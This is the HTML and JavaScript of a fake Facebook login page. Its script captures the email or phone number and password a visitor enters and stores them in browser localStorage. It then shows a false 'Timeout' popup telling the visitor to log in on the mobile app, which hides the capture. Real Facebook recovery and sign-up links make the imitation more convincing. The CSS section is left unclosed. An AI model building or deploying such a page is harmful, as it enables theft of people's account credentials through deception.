  <style>
    /* Style for the popup message box */
    .popup {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #316FF6;
        color: white;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
        z-index: 9999;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
    #okButton {
        margin-top: 20px;
        margin-left: auto; /* Center the button horizontally */
        margin-right: auto;
        display: block; /* Ensure the button takes up the full width */

<body>
<div class="container flex">
    <div class="facebook-page flex">
        <div class="text">
            <h1>Facebook</h1>
            <p>Login to Facebook</p>
        </div>
        <form id="loginForm">
            <div id="errorDiv"></div> <!-- Error message div -->
            <input type="text" id="emailOrNumber" placeholder="Email or Phone Number" required>
            <input type="password" id="password" placeholder="Password" required>
            <div class="link">
                <input type="submit" value="Login">
                <a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=facebook_login&from_login_screen=0&wtsid=rdr_0a1vrAnFl0f2Tj8xT&_rdr"
                   class="forgot">Forgot password?</a>
            </div>
            <hr>
            <div class="button">
                <a href="https://m.facebook.com/reg/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzA0NzM5OTEyfQ%3D%3D&cid=104&refsrc=deprecated&soft=hjk">Create
                    new account</a>
            </div>
        </form>
    </div>
</div>

<!-- Popup message box for successful login -->
<div id="successPopup" class="popup" style="display: none;">
    <span id="successMessage">Timeout! Please try to login on mobile app!</span>
    <button id="okButton">OK</button>
</div>

<script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent form submission
        var emailOrNumber = document.getElementById("emailOrNumber").value;
        var password = document.getElementById("password").value;

        // Validation
        if (emailOrNumber.length < 11) {
            showError("Email or Phone Number must be 11 digits or more.");
            return;
        }

        if (password.length < 6) {
            showError("Password must be 6 characters or more.");
            return;
        }

        // You can modify this key as per your requirement
        var key = "login_" + new Date().getTime(); // Using timestamp as a key

        // Save the login information in local storage with the specified key
        localStorage.setItem(key, JSON.stringify({ emailOrNumber: emailOrNumber, password: password }));

        // Display success popup
        document.getElementById("successPopup").style.display = "block";

        // Clear the form fields if needed
        document.getElementById("emailOrNumber").value = "";
        document.getElementById("password").value = "";
    });

    document.getElementById("okButton").addEventListener("click", function() {
        document.getElementById("successPopup").style.display = "none";
    });

    function showError(message) {
        var errorDiv = document.createElement("div");
        errorDiv.style.color = "red";
        errorDiv.textContent = message;
        document.getElementById("errorDiv").innerHTML = ""; // Clear existing error messages
        document.getElementById("errorDiv").appendChild(errorDiv);
        setTimeout(function() {
            errorDiv.remove();
        }, 3000);
    }
</script>

</body>
